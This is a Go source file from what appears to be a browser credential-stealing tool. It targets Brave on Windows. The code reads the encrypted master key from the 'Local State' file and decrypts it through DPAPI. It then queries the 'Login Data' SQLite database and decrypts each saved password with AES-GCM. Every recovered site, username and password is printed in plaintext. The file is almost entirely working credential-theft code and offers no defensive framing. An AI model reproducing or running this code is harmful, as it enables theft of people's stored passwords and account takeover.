package internals

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/url"
	"os"
)

type Brave struct {
	name          string
	basePath      string
	decryptionKey []byte // found in "Local State"
}

func NewBrave() (Brave, error) {
	fmt.Print("[+] Initializing Brave\n")
	name := "brave"
	homeDir, _ := os.UserHomeDir()
	basePath, err := getChromiumBasePath(name)
	if err != nil {
		return Brave{name, basePath, nil}, err
	} else {
		basePath = homeDir + basePath
	}

	decKey, err := getBraveDecryptionKey(basePath)
	if err != nil {
		return Brave{name, basePath, nil}, err
	}

	return Brave{name, basePath, decKey}, nil
}

// TODO: refactor, only thing that changes is basePath
func (b Brave) DumpCredentials() ([][]Credentials, error) {
	fmt.Print("[+] Dumping Brave Credentials\n")

	// Brave uses only one profile
	dump := make([][]Credentials, 1)
	credentials, err := getBraveCredentials(fmt.Sprintf("%s\\%s", b.basePath, "Default\\Login Data"))
	if err != nil {
		return nil, err
	}

	if len(credentials) == 0 {
		return dump, errors.New("[!] No credentials")
	}

	fmt.Print("> Brave\n")
	for _, creds := range credentials {
		b.DecryptPassword(&creds.password)
		fmt.Printf("\t| - %s ---> %s:%s\n", creds.loginUrl.Host, creds.username, string(creds.password))
	}
	dump = append(dump, credentials)

	return dump, nil
}

// TODO: refactor, is the same for chrome
func (b Brave) DecryptPassword(psw *[]byte) {
	password := *psw
	iv := password[3:15]
	ps := password[15:]

	block, err := aes.NewCipher(b.decryptionKey)
	if err != nil {
		panic(err.Error())
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}

	plain, err := aesgcm.Open(nil, iv, ps, nil)
	*psw = plain
}

// TODO: refactor, is the same for chrome
func getBraveDecryptionKey(basePath string) ([]byte, error) {
	stateFile, err := os.ReadFile(fmt.Sprintf("%s\\%s", basePath, "Local State"))
	if err != nil {
		return nil, err
	}
	var data struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	err = json.Unmarshal(stateFile, &data)
	if err != nil {
		return nil, err
	}
	keyEnc, err := base64.StdEncoding.DecodeString(data.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}

	// Decrypt the private key
	// Note: the first 5 bytes correspond to "DPAPI" (check with xxd)
	key, err := DecryptKey(keyEnc[5:])
	if err != nil {
		return nil, err
	}
	return key, nil
}

// TODO: refactor, is the same for chrome

func getBraveCredentials(path string) ([]Credentials, error) {
	credentials := make([]Credentials, 0)
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		panic(err)
	}
	defer db.Close()

	selectStatement := "SELECT origin_url, username_value, password_value FROM logins"
	rows, err := db.Query(selectStatement)
	if err != nil {
		return credentials, errors.New(fmt.Sprintf("%s: %s\n", "Brave Running", err.Error()))
	}

	defer rows.Close()
	for rows.Next() {
		var (
			loginUrlStr, user string
			pass              []byte
		)
		err = rows.Scan(&loginUrlStr, &user, &pass)
		if err != nil {
			return credentials, err
		}

		if loginUrlStr == "" || user == "" || pass == nil {
			continue
		}

		loginUrl, err := url.Parse(loginUrlStr)
		if err != nil {
			fmt.Printf("Error parsing %s: %s\n", loginUrlStr, err.Error())
		}
		credentials = append(credentials, Credentials{loginUrl, user, pass})
	}

	return credentials, nil
}
